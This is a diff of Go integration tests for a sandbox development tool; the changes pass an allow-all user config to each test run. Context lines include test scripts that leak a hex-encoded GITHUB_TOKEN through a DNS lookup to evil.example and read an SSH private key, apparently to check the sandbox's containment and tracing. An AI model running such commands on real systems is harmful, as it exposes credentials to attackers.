@@ -216,7 +216,7 @@ func TestSyncOnVM(t *testing.T) {
 	dev := func(script string) string {
 		t.Helper()
 		var out, errOut bytes.Buffer
-		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state, userConfig: "", keep: nil}); code != exitOK {
+		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state, keep: nil, userConfig: allowAll(t)}); code != exitOK {
 			t.Fatalf("dev %q: exit %d: %s", script, code, errOut.String())
 		}
 		return out.String()
@@ -227,7 +227,7 @@ func TestSyncOnVM(t *testing.T) {
 		t.Fatal(err)
 	}
 	var out, errOut bytes.Buffer
-	if code := syncMain(ctx, []string{dir}, &out, &errOut, sboxRun, devHost{stateDir: state}); code != exitOK {
+	if code := syncMain(ctx, []string{dir}, &out, &errOut, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("dry run: exit %d: %s", code, errOut.String())
 	}
 	for _, want := range []string{"changed  README", "added    added.txt", "deleted  keep.txt", "added    mac.txt", "+guest"} {
@@ -235,7 +235,7 @@ func TestSyncOnVM(t *testing.T) {
 			t.Errorf("dry run lacks %q:\n%s", want, out.String())
 		}
 	}
-	if code := syncMain(ctx, []string{"-apply", dir}, &out, &errOut, sboxRun, devHost{stateDir: state}); code != exitOK {
+	if code := syncMain(ctx, []string{"-apply", dir}, &out, &errOut, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("apply: exit %d: %s", code, errOut.String())
 	}
 	if got, _ := os.ReadFile(filepath.Join(dir, "README")); string(got) != "guest\n" {
@@ -270,7 +270,7 @@ func TestGitignoreOnVM(t *testing.T) {
 	t.Cleanup(func() { _ = sboxRun(ctx, nil, io.Discard, io.Discard, "forget", project) })
 	var out, notes bytes.Buffer
 	script := "ls -A; mkdir .next && echo built > .next/b && echo x > .env.local && echo SECRET=2 > .env.example"
-	if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &notes, sboxRun, devHost{stateDir: state}); code != exitOK {
+	if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &notes, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), notes.String())
 	}
 	if out.String() != ".env.example\n.git\n.gitignore\nindex.js\n" && out.String() != ".env.example\n.gitignore\nindex.js\n" {
@@ -280,7 +280,7 @@ func TestGitignoreOnVM(t *testing.T) {
 		t.Errorf("preflight lacks the .gitignore line:\n%s", notes.String())
 	}
 	var plan, errOut bytes.Buffer
-	if code := syncMain(ctx, []string{dir}, &plan, &errOut, sboxRun, devHost{stateDir: state}); code != exitOK {
+	if code := syncMain(ctx, []string{dir}, &plan, &errOut, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sync: exit %d: %s", code, errOut.String())
 	}
 	if p := plan.String(); !strings.Contains(p, "changed  .env.example") || strings.Contains(p, ".next") || strings.Contains(p, ".env.local") {
@@ -387,7 +387,7 @@ func TestDevReattachOnVM(t *testing.T) {
 		t.Helper()
 		var out, errOut bytes.Buffer
 		code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun,
-			devHost{stateDir: state, keep: func(id string, _ int) bool { kept = id; return keep }})
+			devHost{userConfig: allowAll(t), stateDir: state, keep: func(id string, _ int) bool { kept = id; return keep }})
 		if code != exitOK {
 			t.Fatalf("sbox dev %q: exit %d: %s", script, code, errOut.String())
 		}
@@ -523,7 +523,7 @@ func TestDevHooksOnVM(t *testing.T) {
 		t.Helper()
 		var out, errOut bytes.Buffer
 		script := `sleep 2; cat ~/setup-runs ~/started ~/bg; echo "terminal: $GREETING"`
-		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state, userConfig: "", keep: nil}); code != exitOK {
+		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state, keep: nil, userConfig: allowAll(t)}); code != exitOK {
 			t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), errOut.String())
 		}
 		return out.String(), errOut.String()
@@ -552,10 +552,10 @@ func TestDevHooksOnVM(t *testing.T) {
 
 	config("echo setup-env >> ~/setup-runs")
 	var envOut, envErr bytes.Buffer
-	if code := setupEnvMain(ctx, []string{dir}, &envOut, &envErr, sboxRun, devHost{stateDir: state, userConfig: ""}); code != exitOK {
+	if code := setupEnvMain(ctx, []string{dir}, &envOut, &envErr, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox setup-env: exit %d: %s", code, envErr.String())
 	}
-	if code := setupEnvMain(ctx, []string{dir}, &envOut, &envErr, sboxRun, devHost{stateDir: state, userConfig: ""}); code != exitOK {
+	if code := setupEnvMain(ctx, []string{dir}, &envOut, &envErr, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox setup-env again: exit %d: %s", code, envErr.String())
 	}
 	if out, _ := dev(); strings.Count(out, "setup-env") != 2 {
@@ -566,7 +566,7 @@ func TestDevHooksOnVM(t *testing.T) {
 	var kept string
 	keep := func(id string, _ int) bool { kept = id; return true }
 	var out2, errOut2 bytes.Buffer
-	if code := devMain(ctx, []string{dir, "--", "sleep", "2"}, strings.NewReader(""), &out2, &errOut2, sboxRun, devHost{stateDir: state, keep: keep}); code != exitOK {
+	if code := devMain(ctx, []string{dir, "--", "sleep", "2"}, strings.NewReader(""), &out2, &errOut2, sboxRun, devHost{stateDir: state, keep: keep, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox dev: exit %d: %s", code, errOut2.String())
 	}
 	t.Cleanup(func() { _ = sessionMain(ctx, "stop", []string{kept}, io.Discard, io.Discard, sboxRun) })
@@ -599,7 +599,7 @@ func TestDevSecretsOnVM(t *testing.T) {
 uname -n; getent hosts "$(uname -n)" >/dev/null && echo own-name-resolves
 getent hosts "$(printf %s "$GITHUB_TOKEN" | od -An -tx1 | tr -d ' \n').evil.example"; true`
 	var out, errOut bytes.Buffer
-	if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir(), lookupEnv: lookup}); code != exitOK {
+	if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir(), lookupEnv: lookup, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), errOut.String())
 	}
 	if !strings.Contains(out.String(), "token="+value+" plain=yes") || !strings.Contains(out.String(), "not-on-home") {
@@ -642,7 +642,7 @@ mcp:
 	dev := func(script string) string {
 		t.Helper()
 		var out, errOut bytes.Buffer
-		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir()}); code != exitOK {
+		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir(), userConfig: allowAll(t)}); code != exitOK {
 			t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), errOut.String())
 		}
 		return out.String()
@@ -694,7 +694,7 @@ sleep 2`
 	var kept string
 	var out, notes bytes.Buffer
 	keep := func(id string, _ int) bool { kept = id; return true }
-	if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &notes, sboxRun, devHost{stateDir: t.TempDir(), keep: keep}); code != exitOK {
+	if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &notes, sboxRun, devHost{stateDir: t.TempDir(), keep: keep, userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), notes.String())
 	}
 	t.Cleanup(func() { _ = sessionMain(ctx, "stop", []string{kept}, io.Discard, io.Discard, sboxRun) })
@@ -750,7 +750,7 @@ func TestDevMountsOnVM(t *testing.T) {
 	dev := func(script string) string {
 		t.Helper()
 		var out, errOut bytes.Buffer
-		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir(), home: home}); code != exitOK {
+		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir(), home: home, userConfig: allowAll(t)}); code != exitOK {
 			t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), errOut.String())
 		}
 		return out.String()
@@ -786,7 +786,7 @@ func TestDevPushOnBootAndPatchOnVM(t *testing.T) {
 	dev := func(script string) (string, string) {
 		t.Helper()
 		var out, errOut bytes.Buffer
-		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state}); code != exitOK {
+		if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK {
 			t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), errOut.String())
 		}
 		return out.String(), errOut.String()
@@ -800,7 +800,7 @@ func TestDevPushOnBootAndPatchOnVM(t *testing.T) {
 	}
 
 	var patch, errOut bytes.Buffer
-	if code := syncMain(ctx, []string{"-patch", dir}, &patch, &errOut, sboxRun, devHost{stateDir: state}); code != exitOK || !strings.Contains(patch.String(), "+++ b/NOTES") {
+	if code := syncMain(ctx, []string{"-patch", dir}, &patch, &errOut, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK || !strings.Contains(patch.String(), "+++ b/NOTES") {
 		t.Fatalf("sbox sync -patch: exit %d, %s\n%s", code, errOut.String(), patch.String())
 	}
 	cmd := exec.Command("patch", "-p1", "-s", "-E")
@@ -812,7 +812,7 @@ func TestDevPushOnBootAndPatchOnVM(t *testing.T) {
 		t.Errorf("NOTES after the patch = %q", data)
 	}
 	var plan bytes.Buffer
-	if code := syncMain(ctx, []string{dir}, &plan, &errOut, sboxRun, devHost{stateDir: state}); code != exitOK || !strings.Contains(plan.String(), "nothing to sync") {
+	if code := syncMain(ctx, []string{dir}, &plan, &errOut, sboxRun, devHost{stateDir: state, userConfig: allowAll(t)}); code != exitOK || !strings.Contains(plan.String(), "nothing to sync") {
 		t.Errorf("sync after the patch: exit %d:\n%s", code, plan.String())
 	}
 }
@@ -838,7 +838,7 @@ func TestDevRestartOnVM(t *testing.T) {
 		t.Helper()
 		var out, errOut bytes.Buffer
 		args := append(flags, dir, "--", "sh", "-c", script)
-		if code := devMain(ctx, args, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state, keep: keep}); code != exitOK {
+		if code := devMain(ctx, args, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: state, keep: keep, userConfig: allowAll(t)}); code != exitOK {
 			t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), errOut.String())
 		}
 		return out.String(), errOut.String()
@@ -874,7 +874,7 @@ func TestDevChangeCountOnVM(t *testing.T) {
 	var titles []string
 	var mu sync.Mutex
 	asked := -2
-	host := devHost{stateDir: state, pollEvery: time.Second,
+	host := devHost{userConfig: allowAll(t), stateDir: state, pollEvery: time.Second,
 		title: func(s string) { mu.Lock(); titles = append(titles, s); mu.Unlock() },
 		keep:  func(_ string, unsynced int) bool { asked = unsynced; return false }}
 	var out, errOut bytes.Buffer
@@ -952,7 +952,7 @@ func TestDevLiveApplyOnVM(t *testing.T) {
 	t.Cleanup(func() { _ = sboxRun(ctx, nil, io.Discard, io.Discard, "forget", project) })
 	var kept string
 	t.Cleanup(func() { _ = sessionMain(ctx, "stop", []string{kept}, io.Discard, io.Discard, sboxRun) })
-	host := devHost{stateDir: state, home: home, keep: func(id string, _ int) bool { kept = id; return true }}
+	host := devHost{userConfig: allowAll(t), stateDir: state, home: home, keep: func(id string, _ int) bool { kept = id; return true }}
 	dev := func(script string) (string, string) {
 		t.Helper()
 		var out, errOut bytes.Buffer
@@ -1067,7 +1067,7 @@ func TestDevTraceOnVM(t *testing.T) {
 	}
 	script := "cat ~/.ssh/id_ed25519 >/dev/null 2>&1; touch /usr/local/sbox-probe 2>/dev/null; echo done"
 	var out, errOut bytes.Buffer
-	if code := devMain(ctx, []string{"-trace", dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir()}); code != exitOK {
+	if code := devMain(ctx, []string{"-trace", dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir(), userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox dev -trace: exit %d: %s%s", code, out.String(), errOut.String())
 	}
 	for _, want := range []string{"INFO    credential-read  reads /home/runner/.aws/credentials (missing) (in dev.setup)",
@@ -1096,7 +1096,7 @@ func TestDevMCPCommandsOnVM(t *testing.T) {
 	t.Cleanup(func() { _ = sboxRun(ctx, nil, io.Discard, io.Discard, "forget", project) })
 	writeTestFile(t, filepath.Join(dir, "sbox.yaml"), "mcp: {servers: {broken: {command: does-not-exist-sbox}, fine: {command: node}}}\n")
 	var out, notes bytes.Buffer
-	if code := devMain(ctx, []string{dir, "--", "echo", "terminal"}, strings.NewReader(""), &out, &notes, sboxRun, devHost{stateDir: t.TempDir()}); code != exitOK {
+	if code := devMain(ctx, []string{dir, "--", "echo", "terminal"}, strings.NewReader(""), &out, &notes, sboxRun, devHost{stateDir: t.TempDir(), userConfig: allowAll(t)}); code != exitOK {
 		t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), notes.String())
 	}
 	if want := "BLOCKED mcp     broken  could not start: does-not-exist-sbox isn't in the guest"; !strings.Contains(notes.String(), want) || strings.Contains(notes.String(), "fine  could not") {
@@ -1121,7 +1121,7 @@ func TestDevLiveNetworkOnVM(t *testing.T) {
 	t.Cleanup(func() { _ = sboxRun(ctx, nil, io.Discard, io.Discard, "forget", project) })
 	var kept string
 	t.Cleanup(func() { _ = sessionMain(ctx, "stop", []string{kept}, io.Discard, io.Discard, sboxRun) })
-	host := devHost{stateDir: state, keep: func(id string, _ int) bool { kept = id; return true }}
+	host := devHost{userConfig: allowAll(t), stateDir: state, keep: func(id string, _ int) bool { kept = id; return true }}
 	dev := func(script string) (string, string) {
 		t.Helper()
 		var out, errOut bytes.Buffer
